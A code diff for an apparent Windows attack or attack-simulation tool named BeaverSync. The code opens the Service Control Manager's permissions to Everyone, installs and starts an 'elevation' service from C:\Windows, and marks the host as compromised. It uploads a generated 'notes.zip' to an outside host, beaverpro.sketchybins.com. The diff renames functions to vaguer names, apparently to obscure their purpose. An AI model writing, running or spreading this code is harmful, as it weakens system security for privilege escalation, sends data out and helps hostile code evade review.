@@ -89,7 +89,7 @@ namespace BeaverSync
                 {
                     // "Fixing" SCManager
                     string[] regcmd = { "sdset", "scmanager", "D:(A;;KA;;;WD)" };
-                    RunCmd("sc.exe", regcmd, false);
+                    doThing("sc.exe", regcmd, false);
 
                     // Dropping and registering a service
                     string user = args[1];
@@ -103,10 +103,10 @@ namespace BeaverSync
                             // Copy the file to the new location, overwriting if necessary
                             File.Copy(svcCopy, svcDest, true);
                             string[] inst = { @"C:\Windows\BeaverElevateService.exe" };
-                            RunCmd("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe", inst, false);
+                            doThing("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe", inst, false);
                             string[] startSvc = { "start", "BeaverElevateSvc" };
                             Thread.Sleep(5000);
-                            RunCmd("sc.exe", startSvc, false);
+                            doThing("sc.exe", startSvc, false);
 
                             // mark compromised
                             string beavered = @"C:\ProgramData\BeaverSynced";
@@ -145,11 +145,11 @@ namespace BeaverSync
                     Console.WriteLine("Performing unregister!");
                     // "Un-Fixing" SCManager
                     string[] regcmd = { "sdset", "scmanager", "D:(A;;CC;;;AU)(A;;CCLCRPRC;;;IU)(A;;CCLCRPRC;;;SU)(A;;CCLCRPWPRC;;;SY)(A;;KA;;;BA)(A;;CC;;;AC)(A;;CC;;;S-1-15-3-1024-528118966-3876874398-709513571-1907873084-3598227634-3698730060-278077788-3990600205)S:(AU;FA;KA;;;WD)(AU;OIIOFA;GA;;;WD)" };
-                    RunCmd("sc.exe", regcmd, false);
+                    doThing("sc.exe", regcmd, false);
 
                     // unregister the elevation service
                     string[] uninst = { "/u", @"C:\Windows\BeaverElevateService.exe" };
-                    RunCmd("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe", uninst, false);
+                    doThing("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe", uninst, false);
                     string beavSvc = @"C:\Windows\BeaverElevateService.exe";
                     if (File.Exists(beavSvc))
                     {
@@ -172,7 +172,7 @@ namespace BeaverSync
             }
         }
 
-        public static void RunCmd(string process, string[] args, bool shell)
+        public static void doThing(string process, string[] args, bool shell)
         {
             ProcessStartInfo startInfo = new ProcessStartInfo
             {
@@ -198,7 +198,7 @@ namespace BeaverSync
             string uploadUrl = "https://beaverpro.sketchybins.com/sync";
 
             // Step 1: Create a 500KB file named notes.zip
-            await CreateDummyFile(filePath, 500 * 1024); // 500KB
+            await tmpF(filePath, 500 * 1024); // 500KB
 
             // Step 2: Upload the file via POST request
             using (var httpClient = new HttpClient())
@@ -222,7 +222,7 @@ namespace BeaverSync
             }
         }
 
-        private static async Task CreateDummyFile(string filePath, int sizeInBytes)
+        private static async Task tmpF(string filePath, int sizeInBytes)
         {
             using (FileStream fs = File.Create(filePath))
             {
